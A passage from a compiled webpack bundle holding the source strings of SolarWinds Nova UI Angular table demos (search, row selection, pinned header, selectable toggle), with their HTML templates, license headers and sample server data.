LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subscription } from "rxjs";\nimport { debounceTime } from "rxjs/operators";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    SearchComponent,\n    TableComponent,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-search-example",\n    providers: [ClientSideDataSource],\n    templateUrl: "./table-search.example.component.html",\n    styleUrls: ["./table-search.example.component.less"],\n})\nexport class TableSearchExampleComponent implements AfterViewInit, OnDestroy {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource: any = [];\n    public searchTerm: string;\n    public columnsToApplySearch: any = [];\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n    @ViewChild("filteringTable")\n    filteringTable: TableComponent<IExampleTableModel>;\n\n    private outputsSubscription: Subscription;\n    private searchSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleTableModel>\n    ) {\n        dataSourceService.setData(getData());\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n        };\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                }\n            );\n        this.searchSubscription = this.filteringSearch.inputChange\n            .pipe(debounceTime(500))\n            .subscribe(() => {\n                this.onSearch(undefined);\n            });\n\n        this.dataSourceService.applyFilters();\n    }\n\n    public applySearchField(): void {\n        if (!this.columnsToApplySearch.length) {\n            this.columnsToApplySearch = ["location"];\n        } else {\n            this.columnsToApplySearch = [];\n        }\n    }\n\n    public onSearch(value?: string): void {\n        this.dataSourceService.setSearchProperties(this.columnsToApplySearch);\n        this.dataSourceService.applyFilters();\n    }\n\n    public onSearchCancel(): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.searchSubscription.unsubscribe();\n        this.outputsSubscription.unsubscribe();\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 90,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 9,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 17,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-ATFLT-BRNO1",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Austin",\n            status: "Active",\n            outages: 3,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LTF-JYAF75J4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Austin",\n            status: "Active",\n            outages: 56,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},36845:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" style="height: 300px">\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [(selection)]="selection"\n        [selectionConfig]="selectionConfig"\n        [trackBy]="trackBy"\n    >\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon\n                        *ngFor="let icon of element.features"\n                        [icon]="icon"\n                        class="icon-margin"\n                    ></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.status }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <ng-container *ngFor="let check of element.checks">\n                        <nui-icon [icon]="check.icon"></nui-icon>\n                        <div class="ml-2">{{ check.num }}</div>\n                    </ng-container>\n                </div>\n            </td>\n        </ng-container>\n        <tr\n            nui-header-row\n            *nuiHeaderRowDef="displayedColumns; sticky: true"\n            stickyCssClass="nui-table__sticky"\n            StickyDirection="top"\n        ></tr>\n        <tr\n            nui-row\n            *nuiRowDef="let row; columns: displayedColumns"\n            [rowObject]="row"\n        ></tr>\n    </table>\n</div>\n'},72257:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".icon-margin {\n    margin-right: 5px;\n}\n"},28761:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\nimport {\n    ISelection,\n    TableSelectionConfig,\n    TableSelectionMode,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-select-pinned-header-example",\n    templateUrl: "./table-select-pinned-header.example.component.html",\n    styleUrls: ["./table-select-pinned-header.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableSelectPinnedHeaderComponent {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource = getData();\n    public selection: ISelection = {\n        isAllPages: false,\n        include: [2, 3],\n        exclude: [],\n    };\n    public selectionConfig: TableSelectionConfig = {\n        enabled: true,\n        selectionMode: TableSelectionMode.Multi,\n    };\n\n    public trackBy(index: number, item: IExampleTableModel): number {\n        return item.position;\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 52,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 3,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 68,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 86,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 70,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 6,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 71,\n            checks: [\n                {\n                    icon: "status_mixed",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 7,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 6,\n            checks: [\n                {\n                    icon: "status_external",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 8,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 15,\n            checks: [\n                {\n                    icon: "status_inactive",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 9,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 16,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 10,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 96,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},32495:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-table-select">\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [totalItems]="paginationTotal"\n        [(selection)]="selection"\n        [selectionConfig]="selectionConfig"\n        [trackBy]="trackBy"\n    >\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="item">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Item</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.item }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="description">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Description</th>\n            <td\n                nui-cell\n                *nuiCellDef="let element"\n                [tooltipText]="element.description"\n            >\n                {{ element.description }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef>\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="\'enable\'"></nui-icon>\n                </div>\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr\n            nui-row\n            *nuiRowDef="let row; columns: displayedColumns"\n            [rowObject]="row"\n        ></tr>\n    </table>\n</div>\n<nui-paginator\n    id="nui-demo-table-select-paginator"\n    [page]="1"\n    [pageSize]="10"\n    [total]="paginationTotal"\n    activeClass="active"\n    disabledClass="disabled"\n    showPrevNext="true"\n    (pagerAction)="changePagination($event)"\n    #filteringPaginator\n>\n</nui-paginator>\n<nui-divider></nui-divider>\n<h2>Selection result</h2>\n<div class="flex-row-container">\n    <span class="flex-independent-row-item">\n        {{ selection | json }}\n    </span>\n</div>\n'},80311:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    ISelection,\n    PaginatorComponent,\n    SelectorService,\n    TableSelectionConfig,\n    TableSelectionMode,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    item: string;\n    description: string;\n    status: string;\n    location: string;\n}\n\n@Component({\n    selector: "nui-table-select",\n    providers: [ClientSideDataSource],\n    templateUrl: "./table-select.example.component.html",\n})\nexport class TableSelectExampleComponent implements AfterViewInit, OnDestroy {\n    public displayedColumns = [\n        "position",\n        "item",\n        "description",\n        "status",\n        "location",\n    ];\n    public dataSource?: IExampleTableModel[] = [];\n    public paginationTotal?: number;\n    public selectedItems: IExampleTableModel[] = [];\n    public selection: ISelection = {\n        isAllPages: false,\n        include: [2, 3],\n        exclude: [],\n    };\n    public selectionConfig: TableSelectionConfig = {\n        enabled: true,\n        selectionMode: TableSelectionMode.Multi,\n    };\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleTableModel>,\n        public selectorService: SelectorService\n    ) {}\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                    this.paginationTotal = data.paginator?.total;\n                }\n            );\n        this.applyFilters();\n    }\n\n    public changePagination($event: any): void {\n        this.applyFilters();\n    }\n\n    public applyFilters(): void {\n        this.dataSourceService.setData(getData());\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public trackBy(index: number, item: IExampleTableModel): number {\n        return item.position;\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            item: "FOCUS-SVR-02258123",\n            description:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.",\n            status: "status_inactive",\n            location: "Brno",\n        },\n        {\n            position: 2,\n            item: "Man-LT-JYJ4AD5",\n            description: "Sed ut perspiciatis unde omnis iste natus error sit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 3,\n            item: "FOCUS-SVR-02258",\n            description:\n                "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 4,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 5,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 6,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 7,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 8,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 9,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Quis autem vel eum iure reprehenderit qui in ea voluptate.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 10,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 11,\n            item: "FOCUS-SVR-111111",\n            description:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.",\n            status: "status_inactive",\n            location: "Brno",\n        },\n        {\n            position: 12,\n            item: "Man-LT-2222222",\n            description: "Sed ut perspiciatis unde omnis iste natus error sit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 13,\n            item: "FOCUS-SVR-333333",\n            description:\n                "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 14,\n            item: "Man-LT-444444",\n            description:\n                "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 15,\n            item: "Man-LT-555555",\n            description:\n                "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 16,\n            item: "Man-LT-666666",\n            description:\n                "Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 17,\n            item: "Man-LT-777777",\n            description:\n                "Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 18,\n            item: "Man-LT-888888",\n            description:\n                "Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 19,\n            item: "Man-LT-999999",\n            description:\n                "Quis autem vel eum iure reprehenderit qui in ea voluptate.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 20,\n            item: "Man-LT-200000",\n            description:\n                "At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti.",\n            status: "status_up",\n            location: "Brno",\n        },\n    ];\n}\n'},26107:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    id="demo-table-selectable-toggle-btn"\n    nui-button\n    type="button"\n    (click)="toggleSelectable()"\n>\n    Toggle Selectable\n</button>\n<div class="nui-table__container" id="demo-table-selectable-toggle">\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [totalItems]="paginationTotal"\n        [(selection)]="selection"\n        [selectionConfig]="selectionConfig"\n        [trackBy]="trackBy"\n    >\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="item">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Item</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.item }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="description">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Description</th>\n            <td\n                nui-cell\n                *nuiCellDef="let element"\n                [tooltipText]="element.description"\n            >\n                {{ element.description }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef>\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="\'enable\'"></nui-icon>\n                </div>\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr\n            nui-row\n            *nuiRowDef="let row; columns: displayedColumns"\n            [rowObject]="row"\n            [clickableRow]="selectionConfig.enabled"\n        ></tr>\n    </table>\n</div>\n<nui-paginator\n    id="nui-demo-table-select-paginator"\n    [page]="1"\n    [pageSize]="10"\n    [total]="paginationTotal"\n    activeClass="active"\n    disabledClass="disabled"\n    showPrevNext="true"\n    (pagerAction)="changePagination($event)"\n    #filteringPaginator\n>\n</nui-paginator>\n<nui-divider></nui-divider>\n<h2>Selection result</h2>\n<div class="flex-row-container">\n    <span class="flex-independent-row-item">\n        {{ selection | json }}\n    </span>\n</div>\n'},23555:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    ISelection,\n    PaginatorComponent,\n    SelectionModel,\n    SelectorService,\n    TableSelectionConfig,\n    TableSelectionMode,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    item: string;\n    description: string;\n    status: string;\n    location: string;\n}\n\n@Component({\n    selector: "nui-table-selectable-toggle",\n    providers: [ClientSideDataSource],\n    templateUrl: "./table-selectable-toggle.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableSelectableToggleExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public displayedColumns = [\n        "position",\n        "item",\n        "description",\n        "status",\n        "location",\n    ];\n    public dataSource?: IExampleTableModel[] = [];\n    public paginationTotal?: number;\n    public selectedItems: IExampleTableModel[] = [];\n    public selection: ISelection = {\n        isAllPages: false,\n        include: [2, 3],\n        exclude: [],\n    };\n    public selectionConfig: TableSelectionConfig = {\n        enabled: true,\n        selectionMode: TableSelectionMode.Multi,\n    };\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleTableModel>,\n        public selectorService: SelectorService,\n        public changeDetector: ChangeDetectorRef\n    ) {}\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                    this.paginationTotal = data.paginator?.total;\n                    this.changeDetector.markForCheck();\n                }\n            );\n        this.applyFilters();\n    }\n\n    public changePagination($event: any): void {\n        this.applyFilters();\n    }\n\n    public applyFilters(): void {\n        this.dataSourceService.setData(getData());\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public trackBy(index: number, item: IExampleTableModel): number {\n        return item.position;\n    }\n\n    public toggleSelectable(): void {\n        if (this.selectionConfig.enabled) {\n            this.selectionConfig = {\n                enabled: false,\n                selectionMode: TableSelectionMode.None,\n            };\n        } else {\n            this.selectionConfig = {\n                enabled: true,\n                selectionMode: TableSelectionMode.Multi,\n            };\n        }\n        this.selection = new SelectionModel();\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            item: "FOCUS-SVR-02258123",\n            description:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.",\n            status: "status_inactive",\n            location: "Brno",\n        },\n        {\n            position: 2,\n            item: "Man-LT-JYJ4AD5",\n            description: "Sed ut perspiciatis unde omnis iste natus error sit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 3,\n            item: "FOCUS-SVR-02258",\n            description:\n                "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.",\n            status: 